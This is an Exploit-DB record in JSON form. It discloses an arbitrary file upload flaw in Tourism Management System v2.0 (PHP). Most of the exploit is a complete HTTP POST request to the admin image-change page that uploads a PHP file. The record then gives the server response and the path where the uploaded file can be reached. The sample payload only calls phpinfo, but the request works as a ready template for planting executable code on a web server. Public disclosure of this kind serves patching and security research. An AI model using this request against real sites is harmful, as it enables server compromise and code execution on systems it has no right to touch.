{"source": "https://www.exploit-db.com/exploits/51923", "vulnName": "Tourism Management System v2.0 - Arbitrary File Upload", "vulnEDBID": "51923", "vulnCVE": "N/A", "author": "SOSPIRO", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-25", "vulnContent": "# Exploit Title: Tourism Management System v2.0 - Arbitrary File Upload\n# Google Dork: N/A\n# Exploit Author: SoSPiro\n# Date: 2024-02-18\n# Vendor Homepage: https://phpgurukul.com\n# Software Link: https://phpgurukul.com/tourism-management-system-free-download/\n# Version: 2.0\n# Tested on: Windows 10 Pro\n# Impact: Allows admin to upload all files to the web server\n# CVE : N/A\n\n\n# Exploit Description:\nThe application is prone to an arbitrary file-upload because it fails to adequately sanitize user-supplied input.\n\n# PoC request\n\n\nPOST /zer/tms/admin/change-image.php?imgid=1 HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: multipart/form-data; boundary=---------------------------390927495111779706051786831201\nContent-Length: 361\nOrigin: http://localhost\nConnection: close\nReferer: http://localhost/zer/tms/admin/change-image.php?imgid=1\nCookie: PHPSESSID=eqms3ipedmm41hqa1djnu1euhv\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: red\n\n-----------------------------390927495111779706051786831201\nContent-Disposition: form-data; name=\"packageimage\"; filename=\"phpinfo.php\"\nContent-Type: text/plain\n\n<?php phpinfo();?>\n-----------------------------390927495111779706051786831201\nContent-Disposition: form-data; name=\"submit\"\n\n\n-----------------------------390927495111779706051786831201--\n\n\n\n\n===========================================================================================\n\n- Response -\n\nHTTP/1.1 200 OK\nDate: Sun, 18 Feb 2024 04:33:37 GMT\nServer: Apache/2.4.54 (Win64) PHP/8.1.13 mod_fcgid/2.3.10-dev\nX-Powered-By: PHP/8.1.13\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate\nPragma: no-cache\nConnection: close\nContent-Type: text/html; charset=UTF-8\nContent-Length: 8146\n\n============================================================================================\n\n- File location -\n\nhttp://localhost/zer/tms/admin/pacakgeimages/phpinfo.php\n            "}